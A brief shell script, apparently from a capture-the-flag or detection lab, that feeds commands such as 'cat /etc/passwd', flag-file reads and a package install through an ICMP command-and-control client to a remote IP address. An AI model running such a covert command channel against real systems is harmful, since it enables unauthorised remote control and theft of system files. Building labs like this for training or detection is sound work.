#!/bin/sh

tail -f /dev/null
sleep 5
{
  echo "whoami"
  sleep 1
  echo "ls -la"
  sleep 2
  echo "cat /etc/passwd"
  sleep 2
  echo "ls flag"
  sleep 1
  echo "cat ./flag/1.txt"
  sleep 1
  echo "cat ./flag/2.txt"
  sleep 1
  echo "cat ./flag/3.txt"
  sleep 1
  echo "cat ./flag/4.txt"
  sleep 1
  echo "cat ./flag/5.txt"
  sleep 1
  echo "cat ./flag/6.txt"
  sleep 1
  echo "cat ./flag/7.txt"
  sleep 1
  echo "cat ./flag/8.txt"
  sleep 1
  echo "cat ./flag/9.txt"
  sleep 1
  echo "apk add git"
  sleep 5
  echo "exit"
} | python ./icmp-cnc.py -i eth0 -d 8.40.27.10
echo "HELLO" >> hello.txt
tail -f /dev/null